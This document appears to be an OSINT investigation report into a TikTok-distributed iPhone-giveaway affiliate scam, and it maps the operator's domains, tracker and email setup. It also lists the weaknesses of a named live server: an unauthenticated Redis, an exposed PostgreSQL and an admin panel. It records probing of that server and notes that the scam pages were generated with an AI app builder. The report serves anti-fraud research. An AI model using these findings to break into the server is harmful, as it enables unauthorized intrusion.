# epicfunnels.net Investigation

CPA affiliate scam funnel built with Lovable AI, distributed via TikTok.

## Timeline

- **2023-12-14**: app.epicfunnels.net first archived (Wayback Machine — operation predates domain registration)
- **2024-01-11**: socios.epicfunnels.net first archived
- **2024-03-20**: epicfunnels.net first archived (had `/feed/` URL — was a blog/CMS)
- **2024-05-15**: evento.epicfunnels.net first archived
- **2024-05-22**: afiliados.epicfunnels.net first archived
- **2024-06-25**: phef6trk.com registered (affiliate tracker)
- **2024-08-13**: phef6trk.com first archived (Wayback Machine — tracker was live)
- **2024-10-18**: noodledit.com registered (asset CDN)
- **2025-04-09**: mydailysurge.com first archived
- **2025-08-26**: epicfunnels.net registered (per WHOIS — but had content since March 2024)
- **2025-08-28**: AWS EC2 server provisioned (nginx last-modified date)
- **2025-09-29**: iPhone promo image uploaded to GCS
- **2025-12-08**: explore.mydailysurge.com first archived
- **2026-01-25**: Let's Encrypt cert on mail server expired (not renewed)
- **2026-02-20**: jessica.epicfunnels.net first archived
- **2026-03-09**: jenny.epicfunnels.net first archived (now removed)
- **2026-03-15**: jessica.epicfunnels.net page last modified
- **2026-04-08**: Investigation conducted
- **2026-04-08**: Deep OSINT investigation — 12 avenues probed, 2 new domains found
- **2026-04-08**: Engagement bot network observed LIVE — multiple accounts liking investigator's old TikTok comments simultaneously

## Scam Flow

1. Victim gets link (TikTok/social media) to jessica.epicfunnels.net
2. Sees "You've been selected to win an iPhone 17 Pro Max!" with countdown timer
3. Fake "Recent Winners" section using 8 Unsplash stock photos as testimonials
4. Social proof toast notifications ("claimed a spot") via Sonner
5. Color variants: Cosmic Orange, Deep Blue, Silver
6. CTA: "Confirm -> Answer survey -> Claim prize"
7. Click triggers `navigator.sendBeacon("/api/continue-click")` for tracking
8. Then `window.location.href = "/api/continue"` for redirect
9. Both endpoints HTTP 302 to `https://www.phef6trk.com/FGK5P4/2Z57CD5/`
10. That's a CPA affiliate tracking link — operator gets paid per victim click-through
11. Tracker now sinkholed (10.0.0.1) — funnel is broken, infrastructure still live

## Network Map

### Domains

| Domain | Registrar | DNS | Role |
|--------|-----------|-----|------|
| **epicfunnels.net** | Sav.com (2025-08-26) | Cloudflare (cheryl/logan) | Scam landing page + email |
| **noodledit.com** | Cloudflare (2024-10-18) | Cloudflare (cass/felicity) | Asset CDN (GCS backend) |
| **mydailysurge.com** | Cloudflare (2025-03-19) | Cloudflare (cass/felicity) | Second brand (Google Cloud, currently 404) |
| **phef6trk.com** | Squarespace (2024-06-25) | Google Cloud DNS | CPA affiliate tracker (sinkholed) |
| **myamericanprizes.com** | GoDaddy (**2023-08-22**) | Cloudflare (cass/felicity) | OG sweepstakes brand, M365 email (Moxxi Media) |
| **olivimails.com** | — | — | EC2 hostname, **domain expired** |

noodledit.com, mydailysurge.com, and myamericanprizes.com share identical Cloudflare nameservers (cass/felicity) — same Cloudflare account. epicfunnels.net uses different CF nameservers (cheryl/logan).

### Infrastructure

**AWS EC2 (us-east-1)**: 13.220.193.170
- Reverse DNS: `ec2-13-220-193-170.compute-1.amazonaws.com`
- Internal hostname (leaked via SMTP banner): `ip-172-26-15-175.ec2.internal`
- Web: nginx default "Success!" page
- SMTP 587: OPEN
- IMAP 143: OPEN
- IMAP 993 (SSL): OPEN, `IMAP4rev1 AUTH=PLAIN AUTH=LOGIN`, banner: "Mail Delivery Agent"
- Port 25: BLOCKED (AWS default)

**Google Cloud**: mydailysurge.com (34.36.210.5), noodledit.com assets (GCS buckets)

**Cloudflare**: All domains proxied through Cloudflare

### Email Infrastructure

Roundcube 1.6.11 at webmail.epicfunnels.net:
- MX: `_dc-mx.16d4f49190c7.epicfunnels.net` -> 13.220.193.170
- SPF: `v=spf1 a mx ip4:13.220.193.170 -all` (hard fail)
- DMARC: `v=DMARC1; p=quarantine; pct=100`
- Session cookie: HttpOnly but NOT Secure
- Exposed paths (403): `/CHANGELOG.md`, `/SQL/`, `/config/`, `/logs/`

Two SSL certs:
- Mail server direct: Let's Encrypt R13, **EXPIRED Jan 25, 2026**
- Webmail via Cloudflare: Google Trust Services WE1, wildcard `*.epicfunnels.net`, valid Feb-May 2026

### Asset CDN

JS bundle references on noodledit.com:
- `b.noodledit.com/promotions/iphone17promax1000.png` (392KB PNG, EXIF stripped)
- `sassets.noodledit.com/pages/logo_mydailysurge.svg` (programmatically generated, no editor metadata)

Both served from Google Cloud Storage (identified via `x-guploader-uploadid`, `x-goog-*` headers).

### Scam Page

- Lovable AI confirmed: OG images hosted on `lovable.dev`
- Tech: Vite + React SPA + Tailwind CSS (Lovable default stack)
- JS bundle: ~350KB original, ~592KB beautified
- Brands: "GetnGoods" (meta author, @GetnGoods twitter), "MyDailySurge" (logo in assets)
- `robots: noindex, nofollow`

### explore.mydailysurge.com — The SEO Content Farm

Discovered alive at `explore.mydailysurge.com` (HTTP 200) while `mydailysurge.com` itself 404s. This is the **SEO/content marketing arm** of the operation:

- **Platform**: Webflow (site ID `68129c0789b42b5281896601`)
- **Last published**: Thu Mar 26, 2026 11:23:53 UTC
- **Google Analytics**: `G-BSTM4RV28F`
- **Google Tag Manager**: `GTM-N3JVLCTN`
- **Content categories**: Personal Finance, Travel, Home Design, Wellness
- **Stock photos**: Pexels (not Unsplash like the scam page)
- **CSS filename**: `staging-mydailysurge-v1` — still marked as staging
- **Blog CMS**: Webflow CMS with article templates, category pages, sidebar navigation

This is a **legitimate-looking lifestyle blog** designed to build domain authority and drive organic traffic. The scam funnels on epicfunnels.net are the monetization layer — the blog is the traffic funnel.

### Certificate Transparency — Full Subdomain History

CT logs reveal subdomains that **once existed** but are now NXDOMAIN, proving scale-up/scale-down operations:

**epicfunnels.net** (formerly active, now NXDOMAIN):
- `jessica.epicfunnels.net` — **still live** (the one we found)
- `jenny.epicfunnels.net` — person-named funnel #2
- `kylie.epicfunnels.net` — person-named funnel #3
- `afiliados.epicfunnels.net` — Spanish for "affiliates"
- `socio.epicfunnels.net` — Spanish for "partner"
- `socios.epicfunnels.net` — Spanish for "partners"
- `evento.epicfunnels.net` — Spanish for "event"
- `app.epicfunnels.net`, `demo.epicfunnels.net`, `link.epicfunnels.net`, `m.epicfunnels.net`, `vpn.epicfunnels.net`

The Spanish subdomains (afiliados, socio, socios, evento) suggest the operator is **Spanish-speaking** or targeting Spanish-speaking markets alongside English ones.

The person-named subdomains (jessica, jenny, kylie) confirm the TikTok distribution model — each name is a personalized funnel ("Jessica said I could win!").

**mydailysurge.com** CT history:
- Numbered subdomains `1.` through `31.` — **daily rotating landing pages** (all 404 now)
- `explore.` — Webflow content blog (still live)
- `signup.` — registration page (404)
- `trck.` — tracking subdomain (404)

### EC2 Server — More Than Mail

Full port scan of 13.220.193.170 reveals additional services:

| Port | Service | Status | Notes |
|------|---------|--------|-------|
| 22 | SSH | OPEN | |
| 25 | SMTP | BLOCKED | AWS default |
| 80 | HTTP | OPEN | nginx "Success!" page |
| 443 | HTTPS | OPEN | Redirects to HTTP (expired cert) |
| 587 | SMTP Submission | OPEN | Banner: `ip-172-26-15-175.ec2.internal` |
| 143 | IMAP | OPEN | Dovecot |
| 993 | IMAPS | OPEN | `AUTH=PLAIN AUTH=LOGIN` |
| 3000 | **Node.js app** | OPEN | **HTTP 500 Internal Server Error** — crashed |
| 5432 | **PostgreSQL** | OPEN | Database exposed to internet |

**Port 3000** is a crashed Node.js application — likely the backend that handles `/api/continue-click` and `/api/continue` redirects (fronted by Cloudflare Workers or Pages).

**Port 5432** is a PostgreSQL database **listening on the public internet** — a significant security misconfiguration. This likely stores click tracking data, funnel analytics, or email records.

### Asset CDN — Multiple Scam Variants

The noodledit.com GCS buckets contain assets for **multiple scam campaigns**:

- `b.noodledit.com/promotions/iphone17promax1000.png` — iPhone 17 Pro Max (current campaign)
- `b.noodledit.com/promotions/macbook1000.png` — **MacBook variant** (204KB, same 720px format)
- 3 iPhone color variant WebP images on jessica.epicfunnels.net itself (Cosmic Orange 558KB, Deep Blue 477KB, Silver 394KB)

The `1000` suffix in filenames likely refers to the "$1000" prize value used in the scam copy.

## The Full Operation Model

This is a **multi-layer CPA affiliate scam operation**:

```
Layer 1: SEO CONTENT FARM
  explore.mydailysurge.com (Webflow blog)
  Categories: Personal Finance, Travel, Home Design, Wellness
  Purpose: Build domain authority, drive organic traffic
  Analytics: G-BSTM4RV28F / GTM-N3JVLCTN

Layer 2: SCAM FUNNELS
  {jessica,jenny,kylie,...}.epicfunnels.net (Lovable AI)
  "You've been selected to win an iPhone 17 Pro Max!"
  Personalized by name for TikTok/social media distribution
  Also had MacBook variant ready

Layer 3: MONETIZATION
  phef6trk.com (CPA affiliate tracker, now sinkholed)
  Operator gets paid per victim click-through

Layer 4: INFRASTRUCTURE
  AWS EC2 ── mail (Roundcube + Dovecot) + Node.js API + PostgreSQL
  Google Cloud ── mydailysurge hosting + GCS asset buckets
  Cloudflare ── DNS proxy, SSL, possibly Workers for API routing
  Webflow ── SEO content blog
  Lovable AI ── scam page generation

Layer 5: EMAIL
  epicfunnels.net ── full email infra (SPF + DMARC + Roundcube)
  Likely used for spam distribution or affiliate communications
  Spanish affiliate portal subdomains (afiliados, socio, socios)
```

### Operator Profile

- **Language**: Likely Spanish-speaking (afiliados, socio, socios, evento subdomains)
- **Entity**: **Moxxi Media** (moxximedia.onmicrosoft.com) — M365 tenant behind myamericanprizes.com
- **Platform**: **CustomerTestConnect** (Express.js + Handlebars) — the backend that powers myamericanprizes.com
- **Brands**: 15+ including GetnGoods, MyDailySurge, PrizeZappy, SnagNGoods, PlayZoodle, HealthPlanScouts, Fresh Health Plan, LendliV2, Prismique, BenefitsAccessCenter, OPG Housing, and more
- **Verticals**: Gift card sweepstakes, electronics, vehicles, luxury goods, gas rewards, government benefits fraud (food stamps, stimulus, rental assistance), health insurance lead gen, lending
- **Tools**: Lovable AI (scam generation), Webflow (SEO blog), standard DevOps (nginx, Dovecot, PostgreSQL, Node.js)
- **Scale**: 747+ assets across 2 GCS buckets, 15+ brand names, daily rotating subdomains (1-31), multiple product variants — this is an **industrial-scale CPA lead generation factory**
- **OpSec**: EXIF stripped, `noindex/nofollow`, Cloudflare proxied — but leaked internal hostname via SMTP, exposed PostgreSQL to internet, exposed Redis with no auth (now contains cryptojacking malware from a third party), publicly listable GCS buckets, expired SSL cert not renewed, olivimails.com domain expired

## Conclusion

Real-world example of Guardio Labs' VibeScamming research. Lovable AI (scored 1.8/10 — most exploitable tool tested) used to generate a scam funnel page. Multi-domain infrastructure with shared Cloudflare accounts, email capability (SPF+DMARC+Roundcube), and CPA affiliate monetization.

The deeper investigation reveals this is not a one-off — it's a **multi-brand, multi-language, templated scam factory** with an SEO content farm (Webflow) feeding traffic into AI-generated scam funnels (Lovable), monetized through CPA affiliate tracking. The operator has infrastructure for rapid deployment of new campaigns: just generate a new Lovable page, point a new subdomain, and go.

## Artifacts Captured (2026-04-08)

All saved in [artifacts/](artifacts/) before infrastructure goes down:

- [x] `jessica-page.html` — raw HTML snapshot (1.4KB, Vite SPA shell)
- [x] `index-CUlwK__p.js` — JS bundle (349KB)
- [x] `index-CUlwK__p.pretty.js` — beautified JS (591KB)
- [x] `index-D8N5ZY6U.css` — CSS bundle (65KB)
- [x] `iphone17promax1000.png` — promo image from b.noodledit.com (392KB)
- [x] `logo_mydailysurge.svg` — brand logo from sassets.noodledit.com (11KB)
- [x] `ssl-cert-direct.pem` — Let's Encrypt R13 cert from mail server (expired Jan 25, 2026)
- [x] `ssl-cert-cloudflare.pem` — Google Trust WE1 wildcard cert via Cloudflare (valid through May 20, 2026)
- [x] `dns-records.txt` — full dig output for all domains (MX, TXT/SPF, DMARC, NS, A, PTR)
- [x] `favicon.ico` — site favicon (20KB)
- [x] `macbook1000.png` — MacBook variant promo image from b.noodledit.com (204KB)
- [x] `iphone-cosmicorange-prqXxnzj.webp` — iPhone Cosmic Orange variant (558KB)
- [x] `iphone-deepblue-UwoIw3eQ.webp` — iPhone Deep Blue variant (477KB)
- [x] `iphone-silver-JpOn6eFE.webp` — iPhone Silver variant (394KB)
- [x] `explore-mydailysurge.html` — full Webflow SEO blog snapshot (61KB)
- [x] `lovable-og-image.png` — Lovable AI OG image used by scam page (258KB)
- [x] `ct-logs.txt` — certificate transparency logs for all 4 domains (31KB)
- [ ] Screenshots (headless browser capture) — TODO, needs headless Chrome/Playwright

## Follow-up Investigation (2026-04-08)

Containerized re-investigation confirmed the write-up findings and revealed changes:

### What's Still Live
- jessica.epicfunnels.net serving the scam page (HTML + JS + CSS)
- Both API endpoints (`/api/continue-click`, `/api/continue`) still 302 → `phef6trk.com/FGK5P4/2Z57CD5/`
- noodledit.com asset CDN (b. and sassets. subdomains) still serving promo image + logo
- Email infrastructure: SMTP 587, IMAP 143, IMAP 993 all responding on 13.220.193.170
- SMTP banner still leaking internal hostname: `ip-172-26-15-175.ec2.internal`
- Roundcube paths `/CHANGELOG.md`, `/SQL/`, `/config/`, `/logs/` still return 403

### What Changed
- **phef6trk.com**: still sinkholed at `10.0.0.1` across all major resolvers (Google, Cloudflare, Quad9). Whois now returns empty — registrar may have scrubbed records
- **mydailysurge.com**: now returning 404 via Google Frontend — second brand appears abandoned
- **Roundcube version string**: no longer visible on login page (may have been patched or page changed)
- **noodledit.com main page**: returns empty response (no content served at root)
- **Direct SSL cert**: still expired (Jan 25, 2026), Cloudflare auto-renewed wildcard masking it

## Reinvestigation #2 (2026-04-09)

Full 8-probe containerized reinvestigation. All raw data in `artifacts/reinvestigation-2026-04-08/`.

### New Discoveries

- **Redis (port 6379) NOW OPEN** on EC2 server (13.220.193.170) — not present in any previous scan. Exposed to public internet. Likely added as caching or session store layer.
- **DKIM record found**: `mail._domainkey.epicfunnels.net` has `v=DKIM1; k=rsa; p=DKIM-SUPPORT-IS-NOT-ACTIVATED` — DNS configured but DKIM was never completed. RSA key is a placeholder.
- **epicfunnels.net root domain** now resolves to Cloudflare IPs (104.21.11.211, 172.67.192.166) and serves HTTP 200

### Infrastructure Changes

| What | Before (2026-04-08) | Now (2026-04-09) | Interpretation |
|------|---------------------|-------------------|----------------|
| jenny.epicfunnels.net | Resolves (live) | NXDOMAIN | Funnel removed |
| kylie.epicfunnels.net | Resolves (live) | NXDOMAIN | Funnel removed |
| www.epicfunnels.net | NXDOMAIN | Resolves (HTTP 200) | Activated |
| epicfunnels.net root | Behind CF proxy | HTTP 200 via CF | Now serving content |
| EC2 port 6379 (Redis) | Not seen | OPEN | New service added |
| explore.mydailysurge.com proxy | Google Frontend | Cloudflare | CDN/proxy switched |
| explore.mydailysurge.com Last-Modified | Mar 26, 2026 | **Apr 5, 2026** | Content updated 3 days ago |
| Roundcube exposed paths | HTTP 403 | HTTP 301 | HTTPS redirect reconfigured |
| phef6trk.com NS records | Google Cloud DNS | EMPTY | Completely scrubbed |
| phef6trk.com whois | Squarespace registrar | EMPTY | Registrar scrubbed all records |

### What's Still the Same

- jessica.epicfunnels.net still serving the scam page (same JS bundle `index-CUlwK__p.js`, same CSS)
- `/api/continue` and `/api/continue-click` still HTTP 302 → `phef6trk.com/FGK5P4/2Z57CD5/` (broken — tracker sinkholed)
- noodledit.com CDN (b. and sassets. subdomains) still serving all assets (iPhone, MacBook, logo)
- SMTP 587 still leaking `ip-172-26-15-175.ec2.internal`
- PostgreSQL 5432 still exposed to internet
- Node.js 3000 still HTTP 500 (crashed)
- Direct SSL cert still expired (Jan 25, 2026)
- Cloudflare wildcard cert still valid through May 20, 2026
- phef6trk.com still sinkholed at 10.0.0.1 across all 3 resolvers
- Lovable AI OG image still accessible at lovable.dev
- explore.mydailysurge.com Webflow site ID, GA, GTM all unchanged
- mydailysurge.com root still 404 via Google Frontend

### Operator Behavior Analysis

The operator is **actively maintaining infrastructure** despite the broken monetization:

1. **Consolidating funnels**: Removed jenny and kylie subdomains, keeping only jessica. Possibly rotating to a single active funnel or preparing to redeploy under new names.
2. **Activating root domain**: www.epicfunnels.net and epicfunnels.net root now serve HTTP 200 — possibly building a new landing page or redirector.
3. **Adding infrastructure**: Redis on port 6379 suggests active development — adding caching, rate limiting, or session management.
4. **Updating content farm**: explore.mydailysurge.com was updated April 5 (3 days before this probe) and migrated from Google Frontend to Cloudflare. Still investing in SEO.
5. **NOT fixing the tracker**: /api/continue still points to sinkholed phef6trk.com. Either doesn't know it's sinkholed, or is preparing a new tracker and hasn't switched yet.
6. **Reconfiguring Roundcube**: Paths changed from 403 to 301, suggesting HTTPS redirect policy was updated.

### Graph Data

Network graph JSON with all entities and connections: `graph/network-graph.json`
- **69 nodes**: 5 domains, 21 subdomains, 11 IPs, 11 services, 5 platforms, 2 brands, 5 certs, 4 email configs, 4 assets, 1 tracker, 3 verifications
- **79 edges**: resolves_to, hosts, serves, redirects_to, shared_cloudflare_account, uses_platform, has_certificate, has_email_config, backed_by, hosts_assets_for, same_operator, child_of, virtual_host_on, configured_for, has_verification
- Compatible with D3.js, Cytoscape.js, Sigma.js for visualization

## Deep Capture (2026-04-09 02:35-02:41 UTC)

6 parallel containerized probes + JS bundle analysis + olivimails.com follow-up. All raw data in `artifacts/deep-capture-2026-04-09/`.

### CRITICAL: 5th Domain — olivimails.com

SMTP STARTTLS and IMAPS certificates on 13.220.193.170 reveal a **self-signed cert** not seen through Cloudflare:

```
Subject: CN = fqdn.olivimails.com
Issuer:  O = Hestia Control Panel, L = San Francisco, ST = California, C = US
Created: Aug 28, 2025 09:24:26 (same day as server provisioning)
```

**olivimails.com** is the **original server hostname** before epicfunnels.net was added. No public DNS, no CT logs — a "shadow domain" only visible via direct server connection. The EC2 nginx has virtual hosts for both `olivimails.com` (serves "Success!" default) and `fqdn.olivimails.com` (serves "Coming Soon" page with domain name in footer).

### CRITICAL: Hestia Control Panel on Port 8083

`https://13.220.193.170:8083/` serves the **Hestia Control Panel v1.9.4** login page — the admin interface that manages the entire server (nginx, Dovecot, PostgreSQL, Node.js, Redis). Login title: "LOGIN - fqdn.olivimails.com - Hestia Control Panel". Session cookie HESTIASID uses HttpOnly + Secure + SameSite=Strict.

### CRITICAL: Redis 7.4.7 — COMPLETELY OPEN

Port 6379 `INFO` dump reveals:
- **No authentication**: `requirepass` is empty, `protected-mode: no`
- **Bound to all interfaces**: `bind: * -::*`
- **Uptime**: 75 days (~January 24, 2026)
- **Running in Docker**: PID 1, executable `/data/redis-server`
- **OS**: Linux 6.1.0-42-cloud-amd64 (Debian cloud kernel)
- **Database**: 4 keys in db0, 2.56MB used, 3.78GB total system memory
- **500 cached Lua scripts** — indicates active programmatic use

### TXT Record Intelligence

Three verification records on epicfunnels.net reveal third-party service integrations:

| Record | Service | Significance |
|--------|---------|-------------|
| `google-site-verification=qWPTL9H_t4lE4Lja7ZwdNCdmGBQEaTmtJiX7KpXbkxM` | Google Search Console | Operator has GSC access (identity clue) |
| `MS=ms66511106` | Microsoft 365 | Domain verified for M365/Azure AD |
| `activeprospect-domain-verification=M+mUYgTDEprxDUAdcdobLA==` | ActiveProspect | TCPA consent/lead verification — confirms CPA lead gen |

**Two conflicting SPF records** (invalid per RFC 7208):
1. `v=spf1 a mx ip4:13.220.193.170 -all` (mail server)
2. `v=spf1 include:spf.protection.outlook.com include:mail.zendesk.com -all` (M365 + Zendesk)

### epicfunnels.net Root Domain — Now Serving Scam Page

epicfunnels.net and www.epicfunnels.net now serve the **exact same scam page** as jessica.epicfunnels.net — same HTML, same JS bundle (`index-CUlwK__p.js`), same "Free iPhone 17 Pro Max" title, same GetnGoods branding. Previously these were NXDOMAIN.

**robots.txt** explicitly allows Googlebot, Bingbot, Twitterbot, and facebookexternalhit — contradicting the `noindex, nofollow` meta tags. Purpose: enable social media preview cards while blocking search indexing.

### SMTP Capabilities (EHLO)

```
250-SIZE 52428800        (50MB message size limit)
250-8BITMIME
250-PIPELINING
250-PIPECONNECT
250-CHUNKING
250-STARTTLS
250 HELP
```

EHLO response includes our IP in the greeting: `Hello [our-ip]` — no relay restrictions tested.

### Roundcube Details

- **Version confirmed**: rcversion 10611 (1.6.11)
- **Install date**: Asset timestamp `?s=1755356738` = Aug 16, 2025
- **cookie_secure: false** — cookies sent over HTTP
- **session_lifetime: 600** (10 minutes)
- **CSRF token present** per-session

### Virtual Host Map (nginx on EC2 :80)

| Host header | Response | Content |
|------------|----------|---------|
| olivimails.com | 200, 2520 bytes | "Success!" default |
| fqdn.olivimails.com | 200, 2499 bytes | "Coming Soon" construction page |
| epicfunnels.net | 200, 472 bytes | Smaller page (different content!) |
| jessica.epicfunnels.net | 200, 2520 bytes | "Success!" default |
| noodledit.com | 200, 2520 bytes | "Success!" default |
| mydailysurge.com | 200, 2520 bytes | "Success!" default |
| phef6trk.com | 200, 2520 bytes | "Success!" default |
| webmail.epicfunnels.net | 200, no length | Roundcube redirect |
| mail.epicfunnels.net | 200, no length | Roundcube redirect |

### Additional Findings

- **SSH**: OpenSSH 9.2p1 (Debian Bookworm)
- **IPv6**: `2606:4700:3031::ac43:c0a6`, `2606:4700:3033::6815:bd3` (Cloudflare)
- **Node.js :3000**: Every endpoint returns 500 — app is completely dead. Cloudflare Workers handles /api/continue redirects.
- **nginx /server-status**: 403 (mod_status exists but blocked)
- **/.env on epicfunnels.net**: 403 (blocked but file exists)
- **iphone17promax.png** (no "1000" suffix): 427KB, different from iphone17promax1000.png (392KB) — higher res variant
- **8 Unsplash stock photos** used as fake testimonial faces (IDs extracted from JS bundle)
- **crt.sh history**: epicfunnels.net subdomains date back to June 2025 (earlier than Aug 2025 registration — domain was transferred). mydailysurge.com first cert July 21, 2025 (Cloudflare TLS).
- **Sectigo certs** appeared for mydailysurge.com Dec 2025 / Feb 2026 — a third CA alongside Let's Encrypt and Google Trust Services

### Updated Infrastructure Diagram

```
┌─ MANAGEMENT LAYER ──────────────────────────────────────────────┐
│  Hestia Control Panel v1.9.4 (:8083)                            │
│  FQDN: fqdn.olivimails.com                                      │
│  Manages: nginx, Dovecot, PostgreSQL, Node.js, Redis             │
│  *** EXPOSED TO INTERNET ***                                     │
└─────────────────────────────────────────────────────────────────┘
     │
     ▼
┌─ AWS EC2 (13.220.193.170) ──────────────────────────────────────┐
│  :22  SSH (OpenSSH 9.2p1)                                        │
│  :80  nginx ("Success!" + virtual hosts)                         │
│  :443 HTTPS (cert expired Jan 2026)                              │
│  :143 IMAP (Dovecot)                                             │
│  :587 SMTP (leaks ip-172-26-15-175.ec2.internal)                 │
│  :993 IMAPS (Dovecot, AUTH=PLAIN, cert=fqdn.olivimails.com)      │
│  :3000 Node.js (DEAD — HTTP 500 on all endpoints)                │
│  :5432 PostgreSQL (EXPOSED to internet)                          │
│  :6379 Redis 7.4.7 (NO AUTH, protected-mode off, 4 keys)        │
│  :8083 Hestia Control Panel (ADMIN PANEL EXPOSED)                │
└─────────────────────────────────────────────────────────────────┘
     │
     ▼
┌─ DOMAINS (6) ───────────────────────────────────────────────────┐
│  olivimails.com ──── original server hostname (no public DNS)    │
│  epicfunnels.net ─── scam funnels + email (CF: cheryl/logan)     │
│  noodledit.com ───── asset CDN on GCS (CF: cass/felicity)        │
│  mydailysurge.com ── SEO content farm (CF: cass/felicity)        │
│  phef6trk.com ────── CPA tracker (SINKHOLED at 10.0.0.1)        │
│  myamericanprizes.com ─ sweepstakes brand (linked from privacy)  │
└─────────────────────────────────────────────────────────────────┘
     │
     ▼
┌─ THIRD-PARTY INTEGRATIONS ──────────────────────────────────────┐
│  Google Search Console ── domain verified                        │
│  Microsoft 365 ────────── MS=ms66511106                          │
│  ActiveProspect ───────── TCPA consent verification              │
│  Zendesk ──────────────── included in SPF                        │
│  Outlook.com ──────────── included in SPF                        │
│  Lovable AI ───────────── scam page generator                    │
│  Webflow ──────────────── SEO blog host                          │
│  Jornaya ──────────────── lead intelligence / TCPA consent       │
│  EasyScan AMOE ────────── sweepstakes entry (key: 4j8lbrw52v)   │
│  Ve Global ────────────── retargeting platform (in GTM)          │
└─────────────────────────────────────────────────────────────────┘
```

---

## Deep OSINT Investigation (2026-04-08)

12 new avenues probed. Results in `artifacts/deep-osint-2026-04-08/`.

### New Domains Discovered

**myamericanprizes.com** — Linked from mydailysurge.com's privacy policy and do-not-sell page. This is the **6th connected domain**. The privacy policy references both `myamericanprizes.com/terms-and-conditions` and `myamericanprizes.com/do-not-sell`, confirming it's operated by the same entity.

**easyscanamoe.com** — Alternative Means of Entry (AMOE) sweepstakes system. The terms of use page links to `easyscanamoe.com/easyscan/default/enter?amoe_key=4j8lbrw52v`. AMOE systems are required by US sweepstakes law to provide a free entry method — this confirms the operation presents itself as a legitimate sweepstakes while actually running CPA lead generation.

### Wayback Machine: The Operation Is Older Than We Thought

Internet Archive snapshots reveal the infrastructure predates the apparent registration dates:

| Domain/Subdomain | Snapshots | First Archive | Key Finding |
|---|---|---|---|
| epicfunnels.net | 12 | **March 2024** | Had a `/feed/` URL (blog/CMS) |
| app.epicfunnels.net | 22 | **December 2023** | Active 20 months before "registration" |
| evento.epicfunnels.net | 22 | May 2024 | Spanish event pages |
| afiliados.epicfunnels.net | 16 | May 2024 | Spanish affiliate pages |
| socios.epicfunnels.net | 1 | January 2024 | Spanish partner page |
| phef6trk.com | 19 | August 2024 | Multi-campaign tracker |
| mydailysurge.com | 11 | April 2025 | Sweepstakes URLs found |
| jessica.epicfunnels.net | 3 | February 2026 | Recent scam funnel |
| jenny.epicfunnels.net | 4 | March 2026 | Recently created, now removed |
| explore.mydailysurge.com | 26 | December 2025 | SEO blog |
| noodledit.com | 0 | — | Never archived |
| olivimails.com | 0 | — | Never archived |

The epicfunnels.net domain had content in March 2024, but WHOIS shows registration in August 2025. This means either: (a) the domain was transferred between operators, or (b) WHOIS data was refreshed during a registrar change.

### phef6trk.com: Multi-Campaign Affiliate Tracker

Wayback Machine captured **19 tracker URLs** revealing the full scale of the CPA operation. This was **not a single-campaign tracker** — it served at least 6 different affiliate accounts:

**Affiliate IDs found in tracker paths:**
- `FGK5P4` (used by epicfunnels.net — the current scam)
- `361GFK`
- `JNS98R`
- `KZDWFR`
- `R1HQJL`
- `THFD9F`
- `7LKLK3`

**Campaign IDs:**
- `2Z57CD5`, `24X9WZ1`, `2JSKXKP`, `2M5TG68`, `2RX68SJ`, `JHMHC2`

**Parameter intelligence from archived URLs:**
- `__po` values (610, 611, 612, 628, 704, 709) — likely offer IDs within the CPA network
- `__ptid` values are UUIDs — per-session tracking identifiers
- `sub1` contains what appear to be publisher IDs or hex strings (`42358`, `47429`, `51398`, `18603`, `6823cf198c7f65155e8a7999`)
- `sub2` contains placement/creative IDs (`108198994`, `108156414`, `109576632`, `108389497`)
- `source_id` field exists but is usually empty
- `__rpt=0&__rpa=0&__rc=1` appear to be anti-fraud parameters (repeat=0, reported=0, count=1)

One URL shows a completely different structure: `/7LKLK3/JHMHC2/?creative_id=3530&uid=68&sub2=69525cd14f95d10001b38125&sub1=3226` — this uses `creative_id` and `uid` parameters instead of the `__po/__ptid` system, suggesting the tracker served multiple CPA networks or had multiple API versions.

### mydailysurge.com: Sweepstakes Operation

Wayback Machine archived URLs confirm mydailysurge.com runs sweepstakes:
- `/sweepstakes/terms-and-conditions`
- `/monthly-daily-giveaway-rules`
- `/do-not-sell`
- `/p/pz-terms-daily`

Combined with the AMOE system (easyscanamoe.com) and ActiveProspect TCPA verification, this is a **compliant-looking sweepstakes operation** — the legal infrastructure is professionally assembled even though the underlying scam pages are AI-generated garbage.

### Webflow CMS: Identity Leaks

The explore.mydailysurge.com Webflow blog reveals:
- No sitemap.xml (404)
- `/about` page exists (200)
- **`/discover` is password-protected** ("Protected page") — the operator is hiding something behind a Webflow password gate
- `/contact-us` page exists
- Privacy policy links to **activeprospect.com**, **jornaya.com** (lead intelligence platform), and **myamericanprizes.com**
- Terms of use links to **easyscanamoe.com** AMOE system

**Jornaya** is a lead intelligence platform that tracks consumer consent journeys for TCPA compliance. Its presence confirms the operator is generating leads for sale to advertisers who require documented consent chains.

### Microsoft 365: Tenant Deleted

The `MS=ms66511106` TXT record proves the domain was verified against a Microsoft 365 tenant, but the tenant itself returns `invalid_tenant` (AADSTS90002). The operator verified the domain, possibly used M365 for email briefly, then deleted or abandoned the tenant. The conflicting SPF record (`include:spf.protection.outlook.com`) is a ghost from this deleted configuration.

User realm check returns `NameSpaceType: Unknown` — the domain is not federated with any identity provider.

### Social Media: Multi-Platform Presence

HTTP status checks across 4 platforms show **all accounts return 200** (exist):

| Platform | @GetnGoods | @mydailysurge | @theupgradeclub | @jessytheupgradeclub |
|---|---|---|---|---|
| Twitter/X | 200 | 200 | — | — |
| Instagram | 200 | 200 | 200 | 200 |
| TikTok | — | 200 | — | — |
| Facebook | 200 | 200 | — | — |

Also: TikTok @getngoods returns 200. The operation maintains **10+ social media accounts across 4 platforms**.

### Spamhaus: IP Blocklisted

The EC2 IP (`13.220.193.170`) returns `127.255.255.254` on the Spamhaus ZEN DNSBL. This is the **CSS (Combined Spam Sources)** listing — the IP is flagged for sending spam. Not listed on SpamCop, SORBS, or Barracuda.

### SMTP: Port 465 Open (11th Port)

Port 465 (SMTPS/implicit TLS) is **OPEN** — this was not found in the original port scan. The EC2 server now has **11 confirmed open ports**:

```
22 (SSH), 80 (HTTP), 143 (IMAP), 443 (HTTPS), 465 (SMTPS), 587 (SMTP),
993 (IMAPS), 3000 (Node.js), 5432 (PostgreSQL), 6379 (Redis), 8083 (Hestia)
```

SMTP EHLO on 587 leaks internal hostname `ip-172-26-15-175.ec2.internal` and our connecting IP. STARTTLS certificate on 587 is the same self-signed Hestia cert (`fqdn.olivimails.com`). SMTPS on 465 uses the same cert.

VRFY command returns "Administrative prohibition" (disabled). RCPT TO validation requires sender verification first — Exim's sender callout verification is enabled, which is actually a reasonable anti-spam measure. The irony of a spam operation running anti-spam measures on its own mail server.

### Lovable AI: Project ID Valid

